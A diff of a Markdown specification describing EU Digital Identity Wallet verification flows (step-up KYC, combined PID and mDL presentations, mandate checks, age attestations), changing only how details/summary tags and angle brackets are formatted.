-<details><summary><strong>16. User requests higher-privilege action (sell goods)</strong></summary>
+<details>
+<summary><strong>16. User requests higher-privilege action (sell goods)</strong></summary>
 
 The User decides to sell goods on the marketplace, which requires identity verification. This might be age verification (to ensure the seller is over 18) or full KYC depending on the marketplace's policies and local regulations. The User clicks "Become a seller" or similar, triggering a backend check by the RP.
 
 
 </details>
-<details><summary><strong>17. RP Server checks identity_verified flag and triggers step-up</strong></summary>
+<details>
+<summary><strong>17. RP Server checks identity_verified flag and triggers step-up</strong></summary>
 
 The RP's backend checks the pseudonym account's `identity_verified` flag. Finding it `false`, the RP determines that a **step-up** identity verification is required before the User can access seller functionality. The RP does not reject the User — it initiates a seamless upgrade flow within the current session. The RP prepares an OpenID4VP authorization request to request the necessary identity attributes.
 
 **Audit Telemetry:** The RP Server logs a `STEP_UP_VERIFICATION_TRIGGERED` event.
 
 </details>
-<details><summary><strong>18. RP Server sends OpenID4VP Authorization Request to Browser</strong></summary>
+<details>
+<summary><strong>18. RP Server sends OpenID4VP Authorization Request to Browser</strong></summary>
 
 The RP initiates an OpenID4VP authorization request with a DCQL query requesting `age_over_18` from the User's PID. Critically, the RP sets the OpenID4VP `nonce` parameter to include the original WebAuthn challenge (or a derivative), creating a **cross-ceremony binding** (§16.7.3, Strategy 2: Challenge Embedding). The request URL might look like:
 
@@ -11917,26 +12211,30 @@ The JWT at `request_uri` contains the DCQL query:
 **Artifact Produced:** `OpenID4VP Authorization Request` (DCQL Query Payload)
 
 </details>
-<details><summary><strong>19. Browser forwards DCQL request to Wallet Unit</strong></summary>
+<details>
+<summary><strong>19. Browser forwards DCQL request to Wallet Unit</strong></summary>
 
 The browser receives the OpenID4VP authorization request and forwards it to the Wallet Unit. On mobile devices, this typically involves opening a deep link (`eudi-wallet://`) that launches the Wallet Unit app. The Wallet Unit receives the DCQL query and parses it to understand what credentials and claims the RP is requesting.
 
 
 </details>
-<details><summary><strong>20. Wallet Unit prompts User for consent to share age_over_18</strong></summary>
+<details>
+<summary><strong>20. Wallet Unit prompts User for consent to share age_over_18</strong></summary>
 
 The Wallet Unit displays a consent prompt: *"marketplace.example.com requests: Are you over 18?"*. This shows the RP's human-readable name, the specific attribute being requested (`age_over_18`), and the purpose (if provided by the RP). The Wallet Unit highlights that no other personal data (name, address, date of birth) will be shared.
 
 
 </details>
-<details><summary><strong>21. User consents and authenticates via biometric</strong></summary>
+<details>
+<summary><strong>21. User consents and authenticates via biometric</strong></summary>
 
 The User reviews the consent prompt and approves the disclosure. The Wallet Unit requires user verification (biometric or PIN) before releasing any credential data. This ensures that even if the device is unlocked, an attacker cannot silently extract the User's identity attributes.
 
 **Failure Path:** If the User explicitly denies consent or authentication fails, the Wallet Unit aborts the presentation and logs a `STEP_UP_CONSENT_DENIED` event.
 
 </details>
-<details><summary><strong>22. Wallet Unit returns vp_token with selectively disclosed SD-JWT VC</strong></summary>
+<details>
+<summary><strong>22. Wallet Unit returns vp_token with selectively disclosed SD-JWT VC</strong></summary>
 
 The Wallet Unit constructs a `vp_token` containing an SD-JWT VC with only `age_over_18: true` selectively disclosed. The SD-JWT uses selective disclosure to reveal just this single claim — no name, no date of birth, no address. The response is returned to the browser:
 
@@ -11959,13 +12257,15 @@ The Wallet Unit constructs a `vp_token` containing an SD-JWT VC with only `age_o
 **Artifact Produced:** `vp_token` (SD-JWT VC containing requested claims)
 
 </details>
-<details><summary><strong>23. Browser forwards vp_token to RP Server</strong></summary>
+<details>
+<summary><strong>23. Browser forwards vp_token to RP Server</strong></summary>
 
 The browser POSTs the `vp_token` to the RP's OpenID4VP response endpoint (via the `response_uri` or redirect URI specified in the authorization request). The RP receives the selectively disclosed SD-JWT VC containing only the `age_over_18` claim, ready for verification.
 
 
 </details>
-<details><summary><strong>24. RP Server verifies SD-JWT VC and cross-ceremony binding</strong></summary>
+<details>
+<summary><strong>24. RP Server verifies SD-JWT VC and cross-ceremony binding</strong></summary>
 
 The RP's backend performs the standard SD-JWT VC verification (§18.5, §14.3) and additionally:
 
@@ -11976,7 +12276,8 @@ The RP's backend performs the standard SD-JWT VC verification (§18.5, §14.3) a
 **Failure Path:** If any verification check fails, it indicates an invalid step-up attempt. The RP Server MUST log a `STEP_UP_BINDING_FAILED` security alert and terminate the request.
 
 </details>
-<details><summary><strong>25. RP Server upgrades account to LoA Substantial</strong></summary>
+<details>
+<summary><strong>25. RP Server upgrades account to LoA Substantial</strong></summary>
 
 Having verified the attribute, the RP upgrades the pseudonym account:
 
@@ -11999,51 +12300,59 @@ Having verified the attribute, the RP upgrades the pseudonym account:
 **Artifact Produced:** `LoA Substantial Account Record` (`identity_verified: true`, stored in RP DB)
 
 </details>
-<details><summary><strong>26. User returns to marketplace (weeks later)</strong></summary>
+<details>
+<summary><strong>26. User returns to marketplace (weeks later)</strong></summary>
 
 The User returns to the marketplace weeks after completing the step-up identity verification in Phase 3. The User initiates a login by clicking "Sign in with passkey" — the same frictionless authentication experience they had during Phase 2, but now the account is KYC-verified and the session will be treated at a higher assurance level.
 
 
 </details>
-<details><summary><strong>27. RP Server sends WebAuthn assertion request to Browser</strong></summary>
+<details>
+<summary><strong>27. RP Server sends WebAuthn assertion request to Browser</strong></summary>
 
 The RP generates `PublicKeyCredentialRequestOptions` containing the RP's `rpId` and a fresh `challenge_A2` (a new cryptographic random nonce, distinct from the `challenge_A1` used in Phase 2). This is a standard WebAuthn assertion request, identical to Phase 2 — no special handling is required for the KYC-verified status at this step.
 
 **Artifact Produced:** `PublicKeyCredentialRequestOptions` (Client-Side JSON with challenge_A2)
 
 </details>
-<details><summary><strong>28. Browser forwards assertion request to Wallet Unit</strong></summary>
+<details>
+<summary><strong>28. Browser forwards assertion request to Wallet Unit</strong></summary>
 
 The browser receives the `PublicKeyCredentialRequestOptions` and forwards the request to the Wallet Unit via the platform's WebAuthn API. The Wallet Unit identifies the stored credential for this RP (the same passkey created in Phase 1) and prepares to prompt the User for authentication.
 
 
 </details>
-<details><summary><strong>29. Wallet Unit prompts User for biometric/PIN</strong></summary>
+<details>
+<summary><strong>29. Wallet Unit prompts User for biometric/PIN</strong></summary>
 
 The Wallet Unit prompts the User to authenticate via biometric (Face ID, fingerprint) or device PIN. This is the same user verification step as in Phase 2 — the Wallet Unit does not treat this differently because the underlying account is now KYC-verified. The verification is purely about proving possession of the device and consent to authenticate.
 
 
 </details>
-<details><summary><strong>30. Wallet Unit returns signed assertion to Browser</strong></summary>
+<details>
+<summary><strong>30. Wallet Unit returns signed assertion to Browser</strong></summary>
 
 The Wallet Unit uses the stored private key to sign the challenge (`challenge_A2`), creating an assertion. The assertion includes the `credentialId`, `authenticatorData`, and `signature`. This is cryptographically identical to the Phase 2 authentication — the passkey has not changed, only the RP's internal account metadata has been upgraded.
 
 **Artifact Produced:** `AuthenticatorAssertionResponse` (ECDSA P-256 Signature)
 
 </details>
-<details><summary><strong>31. Browser forwards assertion to RP Server</strong></summary>
+<details>
+<summary><strong>31. Browser forwards assertion to RP Server</strong></summary>
 
 The browser POSTs the `PublicKeyCredential` assertion to the RP's WebAuthn authentication endpoint. The payload is identical to Phase 2 — a signed challenge proving possession of the private key associated with the stored credential.
 
 
 </details>
-<details><summary><strong>32. RP Server verifies assertion and authenticates pseudonym</strong></summary>
+<details>
+<summary><strong>32. RP Server verifies assertion and authenticates pseudonym</strong></summary>
 
 The RP verifies the signature using the stored public key, validates the `authenticatorData`, and checks the `challenge_A2` matches the expected value. Upon successful verification, the RP identifies the User as the holder of this pseudonymous credential. The authentication itself is identical to Phase 2 — it's the subsequent lookup of account metadata that differs.
 
 
 </details>
-<details><summary><strong>33. RP Server checks identity_verified flag and grants LoA Substantial access</strong></summary>
+<details>
+<summary><strong>33. RP Server checks identity_verified flag and grants LoA Substantial access</strong></summary>
 
 After authenticating the pseudonym, the RP checks the account's `identity_verified` and `assurance_level` fields. Finding `identity_verified: true` and `assurance_level: "substantial"`, the RP grants access to seller functionality — even though this session involves only a passkey login and no attribute presentation. The identity verification from Phase 3 "carries forward" through the pseudonym binding. The User can now sell goods, access higher-value transactions, or perform any action requiring LoA Substantial.
 
@@ -12594,7 +12903,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. RP Instance decrypts JWE and extracts vp_token</strong></summary>
+<details>
+<summary><strong>1. RP Instance decrypts JWE and extracts vp_token</strong></summary>
 
 The RP receives the encrypted response payload (`direct_post.jwt`) — a JWE encrypted with the RP's ephemeral public key (from the `jwks` parameter in the original JAR). The RP decrypts using `ECDH-ES` key agreement with `A256GCM` content encryption (HAIP 1.0 §6.4). After decryption, the RP parses the resulting JSON and extracts the `vp_token` field, the `presentation_submission` (which maps each credential to the DCQL query it satisfies), and the `state` parameter (to correlate with the original session). See §9.2 step 19 for the full JWE decryption flow with payload example.
 
@@ -12603,15 +12913,16 @@ The RP receives the encrypted response payload (`direct_post.jwt`) — a JWE enc
 **Audit Telemetry:** On failure, the RP Instance MUST log a `PRESENTATION_DECRYPTION_FAILED` SIEM alert.
 
 </details>
-<details><summary><strong>2. RP Instance parses multiple attestations from vp_token</strong></summary>
+<details>
+<summary><strong>2. RP Instance parses multiple attestations from vp_token</strong></summary>
 
 The RP examines the `vp_token` structure. When the DCQL query requested multiple credentials (§18.5.5), the `vp_token` is a **JSON object** (not an array) where each key corresponds to a DCQL credential query ID:
 
 ```json
 {
   "vp_token": {
-    "pid_credential": "<Issuer-JWT>~<Disclosure:family_name>~<Disclosure:birth_date>~<KB-JWT>",
-    "mdl_credential": "<CBOR-encoded DeviceResponse>"
+    "pid_credential": "&lt;Issuer-JWT>~&lt;Disclosure:family_name>~&lt;Disclosure:birth_date>~&lt;KB-JWT>",
+    "mdl_credential": "&lt;CBOR-encoded DeviceResponse>"
   }
 }
 ```
@@ -12621,7 +12932,8 @@ The RP uses the `presentation_submission` (or DCQL response mapping) to determin
 **Artifact Produced:** The decoupled `vp_token` structure mapping DCQL queries to disparate credential formats.
 
 </details>
-<details><summary><strong>3. RP Instance verifies issuer signature against LoTE trust anchor</strong></summary>
+<details>
+<summary><strong>3. RP Instance verifies issuer signature against LoTE trust anchor</strong></summary>
 
 For each credential in the `vp_token`, the RP verifies the issuer's cryptographic signature. The verification method depends on the credential format:
 
@@ -12635,7 +12947,8 @@ In both cases, the RP must build a certificate chain from the credential's leaf 
 **Audit Telemetry:** On failure, the RP Instance MUST log a `CREDENTIAL_SIGNATURE_INVALID` SIEM alert.
 
 </details>
-<details><summary><strong>4. RP Instance validates standard claims (exp, iat, vct)</strong></summary>
+<details>
+<summary><strong>4. RP Instance validates standard claims (exp, iat, vct)</strong></summary>
 
 The RP checks the temporal and type validity of each credential:
 
@@ -12651,7 +12964,8 @@ The RP checks the temporal and type validity of each credential:
 **Audit Telemetry:** The RP Instance logs a `CREDENTIAL_VALIDITY_CHECK_FAILED` event upon encountering expired or malformed metadata.
 
 </details>
-<details><summary><strong>5. RP Instance verifies selective disclosure hashes</strong></summary>
+<details>
+<summary><strong>5. RP Instance verifies selective disclosure hashes</strong></summary>
 
 For SD-JWT VC credentials, the RP verifies that each selectively disclosed attribute is authentic by recomputing its hash and matching it against the `_sd` array in the issuer-signed JWT (SD-JWT §6.3):
 
@@ -12667,7 +12981,8 @@ For mdoc credentials, the equivalent check verifies data element digests: the RP
 **Audit Telemetry:** The RP Instance MUST trigger a `SELECTIVE_DISCLOSURE_TAMPERING_DETECTED` severe alert.
 
 </details>
-<details><summary><strong>6. RP Instance verifies device binding (KB-JWT or DeviceAuth)</strong></summary>
+<details>
+<summary><strong>6. RP Instance verifies device binding (KB-JWT or DeviceAuth)</strong></summary>
 
 The RP verifies that the credential was presented by the device to which it was originally issued — preventing credential forwarding and replay attacks (§29.2, Cross-RP Collusion):
 
@@ -12679,14 +12994,16 @@ The RP verifies that the credential was presented by the device to which it was 
 **Audit Telemetry:** The RP Instance MUST trigger a `DEVICE_BINDING_VALIDATION_FAILED` SIEM alert.
 
 </details>
-<details><summary><strong>7. RP Instance queries Status List for revocation check</strong></summary>
+<details>
+<summary><strong>7. RP Instance queries Status List for revocation check</strong></summary>
 
 The RP queries the issuer's Token Status List endpoint for each credential to verify it has not been revoked or suspended since issuance. The RP extracts the `status` claim from the credential (containing the `status_list.uri` and `status_list.idx`), fetches the Status List Token from the URI, and checks the bit at the specified index. See Appendix B (§B.3.1) for the full Status List verification procedure with payload examples.
 
 > **Batch optimisation**: When verifying multiple credentials from the same issuer, the Status List Token may be shared — the RP should cache it after the first fetch to avoid redundant HTTP requests. The cache TTL should respect the `exp` claim in the Status List Token JWT.
 
 </details>
-<details><summary><strong>8. Status List returns credential validity status to RP Instance</strong></summary>
+<details>
+<summary><strong>8. Status List returns credential validity status to RP Instance</strong></summary>
 
 The Status List check returns one of two outcomes per credential: **VALID** (bit at index = 0) or **REVOKED/SUSPENDED** (bit at index = 1). Steps 3–8 are executed **for each credential** in the `vp_token` — either sequentially or in parallel. If any credential is revoked, the RP must decide whether to reject the entire combined presentation or proceed with the remaining valid credentials, depending on the RP's policy configuration (§26.1).
 
@@ -12697,7 +13014,8 @@ The Status List check returns one of two outcomes per credential: **VALID** (bit
 **Audit Telemetry:** The RP Instance logs a `CREDENTIAL_REVOKED_STATUS_DETECTED` event.
 
 </details>
-<details><summary><strong>9. RP Instance performs identity matching across all attestations</strong></summary>
+<details>
+<summary><strong>9. RP Instance performs identity matching across all attestations</strong></summary>
 
 This is the **critical cross-credential binding check** that distinguishes a combined presentation from two unrelated presentations. The RP must prove that all credentials belong to the same User and were presented from the same Wallet Unit:
 
@@ -12710,14 +13028,16 @@ This is the **critical cross-credential binding check** that distinguishes a com
 **Audit Telemetry:** The RP Instance MUST trigger a `CROSS_CREDENTIAL_BINDING_FAILED` SIEM alert, an indicator of potential synthetic identity abuse.
 
 </details>
-<details><summary><strong>10. RP Instance verifies WSCA proof of single WSCD management</strong></summary>
+<details>
+<summary><strong>10. RP Instance verifies WSCA proof of single WSCD management</strong></summary>
 
 If the Wallet provided a Wallet Secure Cryptographic Application (WSCA) binding proof — a cryptographic assertion that all device keys across different credential formats are managed by the same WSCD instance — the RP verifies this proof. This is an additional layer beyond the `cnf.jwk`/`deviceKey` matching in step 9: it proves at the **hardware level** that one physical secure element manages all keys, even if the keys are technically distinct (as in cross-format presentations).
 
 > **Current status**: The WSCA binding proof mechanism is specified in ARF v2.8 §7.6.3 but the concrete cryptographic protocol is still being standardised. As of March 2026, no Wallet Unit implementation produces this proof in production. RPs should implement step 9's key-matching as the primary binding check and treat step 10 as a future-proofing enhancement. When the WSCA proof standard is finalised, it will likely use a COSE_Sign1 structure binding all device keys under a single WSCA attestation certificate.
 
 </details>
-<details><summary><strong>11. RP Instance calculates minimum validity across all credentials</strong></summary>
+<details>
+<summary><strong>11. RP Instance calculates minimum validity across all credentials</strong></summary>
 
 The RP calculates the overall combined presentation validity window by taking the **minimum** `exp` value across all presented credentials. For example, if the PID expires at `2025-12-31T23:59:59Z` and the mDL expires at `2025-06-15T00:00:00Z`, the combined presentation is valid only until `2025-06-15`. This minimum validity determines how long the RP can rely on the combined presentation for session-based decisions (e.g., how long an authenticated session should last before requiring re-verification).
 
@@ -12726,7 +13046,8 @@ The RP calculates the overall combined presentation validity window by taking th
 **Audit Telemetry:** The RP Instance logs a `COMBINED_PRESENTATION_EXPIRY_BOUND` event, recording the calculated minimum validity window.
 
 </details>
-<details><summary><strong>12. RP Instance extracts verified attributes into application logic</strong></summary>
+<details>
+<summary><strong>12. RP Instance extracts verified attributes into application logic</strong></summary>
 
 Having cryptographically verified each individual credential (steps 3–8) and confirmed they belong to the same User and Wallet Unit (steps 9–10), the RP safely merges the disclosed attributes from all credentials into a unified attribute set for application consumption. For example, a combined PID + mDL presentation yields:
 
@@ -12740,7 +13061,7 @@ Having cryptographically verified each individual credential (steps 3–8) and c
   },
   "mdl": {
     "driving_privileges": [{"vehicle_category_code": "B", "expiry_date": "2027-08-01"}],
-    "portrait": "<base64-encoded JPEG>"
+    "portrait": "&lt;base64-encoded JPEG>"
   },
   "_meta": {
     "combined_validity_until": "2025-06-15T00:00:00Z",
@@ -13057,44 +13378,52 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. RP Instance decrypts JWE and extracts vp_token containing LPID + PID + mandate</strong></summary>
+<details>
+<summary><strong>1. RP Instance decrypts JWE and extracts vp_token containing LPID + PID + mandate</strong></summary>
 
 The RP receives the encrypted response payload and decrypts it using the session's ephemeral key. The `vp_token` is a JSON object with three entries keyed by the DCQL credential query IDs (`company_id`, `representative_pid`, `mandate`). Each entry contains an independent SD-JWT VC presentation. The RP parses all three to begin individual verification.
 
 **Artifact Produced:** Decrypted `vp_token` extracting three distinct SD-JWT VC strings for `company_id`, `representative_pid`, and `mandate`.
 
 </details>
-<details><summary><strong>2. RP Instance identifies credential types from vct/docType values</strong></summary>
+<details>
+<summary><strong>2. RP Instance identifies credential types from vct/docType values</strong></summary>
 
 The RP inspects the `vct` claim in each SD-JWT VC to determine the credential type: `EWC_LPID_Attestation` for LPID, `eu.europa.ec.eudi.pid.1` for PID, and `eu.europa.ec.eudi.mandate.1` for the mandate credential. The RP routes each credential to the appropriate verification sub-pipeline based on type — mandate credentials require additional verification steps (phases 4–5) beyond what PID and LPID require.
 
 </details>
-<details><summary><strong>3. RP Instance verifies issuer signature for each credential against LoTE trust anchor</strong></summary>
+<details>
+<summary><strong>3. RP Instance verifies issuer signature for each credential against LoTE trust anchor</strong></summary>
 
 For each of the three credentials, the RP verifies the issuer's ECDSA P-256 signature against the appropriate trust anchor. The PID issuer's trust anchor comes from the PID Provider LoTE, the LPID issuer from the LPID Provider LoTE, and the mandate issuer from the mandate/EAA Provider LoTE. Each trust chain is verified independently — a mandate issued by a QTSP has a different trust anchor from one issued by a public body.
 
 </details>
-<details><summary><strong>4. RP Instance validates standard claims (exp, iat, vct) for each credential</strong></summary>
+<details>
+<summary><strong>4. RP Instance validates standard claims (exp, iat, vct) for each credential</strong></summary>
 
 Standard temporal and type validation applies to all three credentials. For the mandate credential specifically, the RP checks the `validity_period` object (`not_before`, `not_after`) in addition to the SD-JWT VC `exp` — the mandate's validity period may be more restrictive than the credential's expiry time.
 
 </details>
-<details><summary><strong>5. RP Instance verifies selective disclosures for each credential</strong></summary>
+<details>
+<summary><strong>5. RP Instance verifies selective disclosures for each credential</strong></summary>
 
 Each SD-JWT VC's selectively disclosed attributes are verified against the `_sd` hashes. For mandate credentials, Topic I §3.1 requires that `representation_type` and `scope_of_authority` are NOT concealable — the RP verifies these are always disclosed (not behind selective disclosure).
 
 </details>
-<details><summary><strong>6. RP Instance verifies device binding (KB-JWT) for each credential</strong></summary>
+<details>
+<summary><strong>6. RP Instance verifies device binding (KB-JWT) for each credential</strong></summary>
 
 The KB-JWT for each credential is verified against the credential's `cnf.jwk`. The `aud` must match the RP's `client_id`, the `nonce` must match the request nonce, and the `sd_hash` must match the SD-JWT presentation hash.
 
 </details>
-<details><summary><strong>7. RP Instance queries Status List for each credential's revocation status</strong></summary>
+<details>
+<summary><strong>7. RP Instance queries Status List for each credential's revocation status</strong></summary>
 
 The RP checks each credential's Status List. For the mandate credential, the RP should use a **shorter cache TTL** (≤1 hour) compared to PID/LPID (which may use 24h caching). For high-value operations, the mandate Status List should be fetched in real-time (no caching). See §18.6.7 for mandate-specific revocation guidance.
 
 </details>
-<details><summary><strong>8. Status List returns validity status for each credential</strong></summary>
+<details>
+<summary><strong>8. Status List returns validity status for each credential</strong></summary>
 
 Each Status List check returns VALID or REVOKED. If the mandate is revoked, the RP MUST reject the entire presentation — a valid PID and LPID without a valid mandate mean the representative has lost authority. If the PID or LPID is revoked but the mandate is valid, the identity is unverifiable — the RP must also reject.
 
@@ -13103,7 +13432,8 @@ Each Status List check returns VALID or REVOKED. If the mandate is revoked, the 
 **Audit Telemetry:** The RP Instance MUST trigger a `MANDATE_VERIFICATION_REVOKED` SIEM alert if the mandate specifically is found revoked.
 
 </details>
-<details><summary><strong>9. RP Instance verifies all credentials share the same cnf.jwk</strong></summary>
+<details>
+<summary><strong>9. RP Instance verifies all credentials share the same cnf.jwk</strong></summary>
 
 This is the cryptographic binding check from §18.5.4. All three credentials must contain the same `cnf.jwk` public key, proving they are held in the same Wallet Unit. This is necessary but not sufficient — it proves same-wallet, not same-person-acts-for-same-entity.
 
@@ -13112,7 +13442,8 @@ This is the cryptographic binding check from §18.5.4. All three credentials mus
 **Audit Telemetry:** The RP Instance logs a `MANDATE_WALLET_BINDING_FAILED` event upon encountering decoupled credentials.
 
 </details>
-<details><summary><strong>10. RP Instance verifies mandate.representative_id matches pid.personal_identifier</strong></summary>
+<details>
+<summary><strong>10. RP Instance verifies mandate.representative_id matches pid.personal_identifier</strong></summary>
 
 This is the representative ↔ PID binding check from §18.5.3. The mandate credential's `representative_id` must match the PID's `personal_identifier`. This proves the natural person presenting the credentials is the person named in the mandate as the representative.
 
@@ -13121,7 +13452,8 @@ This is the representative ↔ PID binding check from §18.5.3. The mandate cred
 **Audit Telemetry:** The RP Instance logs a `MANDATE_REPRESENTATIVE_MISMATCH` alert.
 
 </details>
-<details><summary><strong>11. RP Instance verifies mandate.represented_entity_id matches lpid.legal_person_id</strong></summary>
+<details>
+<summary><strong>11. RP Instance verifies mandate.represented_entity_id matches lpid.legal_person_id</strong></summary>
 
 This is the mandate ↔ LPID binding check from §18.5.3. The mandate credential's `represented_entity_id` must match the LPID's `legal_person_id` (EUID). This proves the mandate applies to the company identified by the LPID. If the mandate names a different company, the representative cannot act for the presented company.
 
@@ -13130,57 +13462,66 @@ This is the mandate ↔ LPID binding check from §18.5.3. The mandate credential
 **Audit Telemetry:** The RP Instance MUST immediately trigger a `MANDATE_LPID_MISMATCH` alert.
 
 </details>
-<details><summary><strong>12. RP Instance extracts scope_of_authority from mandate credential</strong></summary>
+<details>
+<summary><strong>12. RP Instance extracts scope_of_authority from mandate credential</strong></summary>
 
 The RP reads the `scope_of_authority` object, which contains the `operations` array, `limitations` object, and `exclusions` array. This structured data defines exactly what the representative is authorised to do. See §11.12.3 for the detailed evaluation algorithm.
 
 **Artifact Produced:** Decoded `scope_of_authority` claim JSON structure for mandate evaluation.
 
 </details>
-<details><summary><strong>13. RP Instance matches scope to current operation</strong></summary>
+<details>
+<summary><strong>13. RP Instance matches scope to current operation</strong></summary>
 
 The RP compares its intended operation (e.g., `"contract_signing"`) against the mandate's `scope_of_authority.operations` array. If the operation is found and not in the `exclusions` array, the scope check passes. If not found, the RP applies its ambiguity handling policy (§11.12.3 — deny by default for high-value, allow with logging for low-value).
 
 **Audit Telemetry:** On scope rejection, the RP Instance logs a `MANDATE_SCOPE_EXCEEDED` tracking violation.
 
 </details>
-<details><summary><strong>14. RP Instance checks scope limitations (max_amount, geographic, temporal)</strong></summary>
+<details>
+<summary><strong>14. RP Instance checks scope limitations (max_amount, geographic, temporal)</strong></summary>
 
 For each applicable limitation in `scope_of_authority.limitations`, the RP verifies the current transaction falls within bounds. For `max_transaction_value`, the transaction amount must be ≤ the ceiling. For `geographic_scope`, the RP's jurisdiction must be within the scope. For `time_restriction`, the current time must fall within the allowed period.
 
 **Audit Telemetry:** If bounds are violated, the RP Instance MUST log a `MANDATE_LIMITATION_EXCEEDED` alert, dropping the operation.
 
 </details>
-<details><summary><strong>15. RP Instance verifies joint representation flag and requests additional mandate(s) if needed</strong></summary>
+<details>
+<summary><strong>15. RP Instance verifies joint representation flag and requests additional mandate(s) if needed</strong></summary>
 
 If the mandate credential's `joint_representation` flag is `true`, the RP must verify that ALL required joint representatives have presented valid mandates. The `joint_partner_ids` array lists the identifiers of the other required representatives. The RP must either receive all mandates simultaneously or sequentially within the same session. See §18.5.2 (Joint Representation) for orchestration details.
 
 </details>
-<details><summary><strong>16. RP Instance re-checks mandate Status List in real-time for high-value operations</strong></summary>
+<details>
+<summary><strong>16. RP Instance re-checks mandate Status List in real-time for high-value operations</strong></summary>
 
 For high-value operations (financial transactions above a threshold, contractual commitments), the RP performs a second, real-time Status List fetch specifically for the mandate credential. This guards against the scenario where the mandate was revoked between the initial check (step 7) and the scope verification (steps 12–14) — a narrow window, but significant for high-liability transactions.
 
 </details>
-<details><summary><strong>17. Status List confirms mandate status</strong></summary>
+<details>
+<summary><strong>17. Status List confirms mandate status</strong></summary>
 
 The real-time Status List check confirms the mandate is still valid. If revoked, the RP aborts the transaction immediately — a mandate revoked after the initial check (step 7) but before final authorisation represents a critical security event.
 
 **Audit Telemetry:** A failure at this stage MUST trigger a `REAL_TIME_MANDATE_REVOKED` high-severity SIEM warning indicating a dangerously narrow revocation race condition.
 
 </details>
-<details><summary><strong>18. RP Instance applies business policy engine (CDD, AML, sanctions screening)</strong></summary>
+<details>
+<summary><strong>18. RP Instance applies business policy engine (CDD, AML, sanctions screening)</strong></summary>
 
 The RP feeds the verified triple-credential data into its business rules engine: CDD checks (§22), AML screening against the represented entity, sanctions screening for both the representative and the legal entity. The mandate's scope may trigger additional compliance checks — e.g., a financial mandate triggers PSD2/PSR obligations.
 
 </details>
-<details><summary><strong>19. RP Instance extracts verified attributes into unified claim set</strong></summary>
+<details>
+<summary><strong>19. RP Instance extracts verified attributes into unified claim set</strong></summary>
 
 The RP merges all verified attributes into a unified data structure for application consumption, including `_meta` verification provenance. The mandate-specific metadata includes the scope match result, limitation check results, and whether joint representation was verified.
 
 **Artifact Produced:** Unified Mandate and Identity Record enriched with real-time metadata constraints for the business context.
 
 </details>
-<details><summary><strong>20. RP Instance logs mandate verification for audit trail (§31.3)</strong></summary>
+<details>
+<summary><strong>20. RP Instance logs mandate verification for audit trail (§31.3)</strong></summary>
 
 The RP creates a complete audit log entry (per §31.3) recording: all three credential identifiers, the mandate scope match decision, the double revocation check timestamps, and the final business policy decision. This audit trail is critical for liability protection — if a mandate is later found to have been fraudulent, the RP can demonstrate it performed proper verification at the time of the transaction.
 
@@ -13435,29 +13776,34 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. User opens AV App and requests age attestations</strong></summary>
+<details>
+<summary><strong>1. User opens AV App and requests age attestations</strong></summary>
 
 The user launches the Age Verification App and initiates the attestation issuance process. The app presents a screen explaining that age verification attestations will be obtained from an authorised Attestation Provider, requiring the user to prove their age using a government-issued identity document. The user selects their preferred Attestation Provider from the Commission's authorised list.
 
 </details>
-<details><summary><strong>2. AV App reads identity document via NFC (passport or ID card)</strong></summary>
+<details>
+<summary><strong>2. AV App reads identity document via NFC (passport or ID card)</strong></summary>
 
 The AV App activates the device's NFC reader and instructs the user to hold their passport or national ID card against the phone. The app reads the chip data using the ICAO 9303 protocol (for passports) or the national eID protocol (for ID cards). Since the October 2025 release, direct passport/ID card reading is supported — earlier versions required authentication through a national eID scheme (e.g., eIDAS node).
 
 </details>
-<details><summary><strong>3. National eID returns identity data to AV App (name, DOB, document number)</strong></summary>
+<details>
+<summary><strong>3. National eID returns identity data to AV App (name, DOB, document number)</strong></summary>
 
 The identity document's chip returns the holder's identity data, including name, date of birth, and document number. The AV App uses the date of birth to construct the age assertion but does not store or transmit the full identity data to the Attestation Provider — only the proof that the user meets the age threshold is forwarded.
 
 </details>
-<details><summary><strong>4. AV App sends OID4VCI Credential Request to Attestation Provider</strong></summary>
+<details>
+<summary><strong>4. AV App sends OID4VCI Credential Request to Attestation Provider</strong></summary>
 
 The AV App constructs an OpenID4VCI credential request containing the identity proof (demonstrating LoA Substantial or High identity verification) and a device public key (for binding the attestation to the user's device). The request targets the `eu.europa.ec.av.1` credential type and specifies the desired batch size.
 
 **Artifact Produced:** OID4VCI `Credential Request` payload requesting multiple `eu.europa.ec.av.1` attestations.
 
 </details>
-<details><summary><strong>5. Attestation Provider verifies age at LoA Substantial or High</strong></summary>
+<details>
+<summary><strong>5. Attestation Provider verifies age at LoA Substantial or High</strong></summary>
 
 The Attestation Provider validates the identity proof against the user's age. Per specification §5.3: "An Attestation Provider SHALL NOT issue a Proof of Age attestation before verifying the attestation subject's age at the Level of Assurance 'substantial' or 'high'." The AP confirms the user is over 18 but does not store the user's identity data beyond what is needed for the issuance ceremony.
 
@@ -13466,24 +13812,28 @@ The Attestation Provider validates the identity proof against the user's age. Pe
 **Audit Telemetry:** The Attestation Provider logs an `AGE_VERIFICATION_ISSUANCE_FAILED` or `ISSUANCE_SUCCESS` event, maintaining an auditable trail of the verification decision without retaining PID attributes.
 
 </details>
-<details><summary><strong>6. Attestation Provider generates N mDocs (docType: eu.europa.ec.av.1)</strong></summary>
+<details>
+<summary><strong>6. Attestation Provider generates N mDocs (docType: eu.europa.ec.av.1)</strong></summary>
 
 The AP generates a batch of N individual mDoc credentials, each with `docType: eu.europa.ec.av.1` and the single boolean attribute `age_over_18 = true`. Each mDoc has a unique `ValidityInfo` structure with timestamps deliberately set to "limit linkability information" (spec §5.3) — coarse-grained validity periods prevent temporal fingerprinting across presentations.
 
 </details>
-<details><summary><strong>7. Attestation Provider signs each mDoc with AP ECDSA P-256 key</strong></summary>
+<details>
+<summary><strong>7. Attestation Provider signs each mDoc with AP ECDSA P-256 key</strong></summary>
 
 Each mDoc is individually signed using the AP's ECDSA P-256 signing key, producing a COSE_Sign1 structure in the `issuerAuth` field. The AP's signing key is attested by a certificate chaining to the European Commission's root trust anchor. Crucially, the AP is unaware that ZKP proofs may later be generated from these attestations — the signing process is identical to any standard mDoc issuance.
 
 </details>
-<details><summary><strong>8. Attestation Provider returns OID4VCI Credential Response with batch of N signed mDocs</strong></summary>
+<details>
+<summary><strong>8. Attestation Provider returns OID4VCI Credential Response with batch of N signed mDocs</strong></summary>
 
 The AP returns all N signed mDocs in a single OID4VCI credential response. Each mDoc is bound to the device public key provided in step 4, ensuring only the user's AV App can present them. The batch delivery minimises network round-trips — the user authenticates once and receives all attestations in a single ceremony.
 
